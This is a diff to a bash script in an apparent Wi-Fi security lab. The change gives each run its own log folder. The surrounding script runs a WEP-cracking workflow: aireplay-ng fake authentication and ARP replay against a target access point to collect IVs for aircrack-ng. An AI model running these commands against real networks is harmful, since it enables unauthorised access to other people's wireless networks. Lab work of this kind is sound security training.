@@ -29,7 +29,6 @@ set -u
 SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
 LAB_DIR=$(cd "$SCRIPT_DIR/.." && pwd)
 LOGDIR="$LAB_DIR/logs"
-AIRMON_LOG="$LOGDIR/airmon.log"
 # shellcheck source=wifi-lib.sh
 source "$SCRIPT_DIR/wifi-lib.sh"
 
@@ -66,13 +65,14 @@ wifi_preflight airmon-ng airodump-ng aireplay-ng aircrack-ng iw ip nmcli systemc
 wifi_require_iface "$IFACE"
 
 # ---- output location ------------------------------------------------------
-# All capture/key/log files live under logs/ (gitignored) to keep the repo clean.
-mkdir -p "$LOGDIR"
+# Each run gets its own folder under logs/ (gitignored), so its capture, key and attack output
+# stay together and an earlier run is never overwritten.
+RUNDIR=$(new_run_dir "$LOGDIR" "$PREFIX") || die "Could not create a run folder in $LOGDIR"
+AIRMON_LOG="$RUNDIR/airmon.log"
 : > "$AIRMON_LOG"
-OUT="${LOGDIR}/${PREFIX}"
+OUT="${RUNDIR}/${PREFIX}"
 KEYFILE="${OUT}.key"
-# An old key file with this prefix would look like a new result, so it goes with the old capture.
-rm -f "${OUT}"-*.cap "${OUT}"-*.csv "$KEYFILE" 2>/dev/null
+echo "[*] Run folder: $RUNDIR"
 
 # ---- start capture --------------------------------------------------------
 wifi_guard "$IFACE"
@@ -101,14 +101,15 @@ if [[ "$MODE" == "active" ]]; then
   echo "[*] Associating with AP (fake auth)..."
   # keep re-authenticating every 10s so we stay associated. --ignore-negative-one: aireplay-ng
   # cannot read the monitor channel that wifi_set_channel set, and without the flag it exits.
-  # Run from logs/, so the replay_arp-*.cap it writes lands there. stdbuf keeps the logs current.
-  ( cd "$LOGDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --fakeauth 10 -o 1 -q 10 \
+  # Run from the run folder, so the replay_arp-*.cap it writes lands there.
+  # stdbuf keeps the logs current.
+  ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --fakeauth 10 -o 1 -q 10 \
       -a "$BSSID" -h "$MYMAC" ${ESSID:+-e "$ESSID"} "$MON" ) >"${OUT}-fakeauth.txt" 2>&1 &
   fakeauth_pid=$!
   track_pid "$fakeauth_pid"
 
   echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
-  ( cd "$LOGDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" ) \
+  ( cd "$RUNDIR" && exec stdbuf -oL aireplay-ng --ignore-negative-one --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" ) \
     >"${OUT}-arpreplay.txt" 2>&1 &
   arp_pid=$!
   track_pid "$arp_pid"
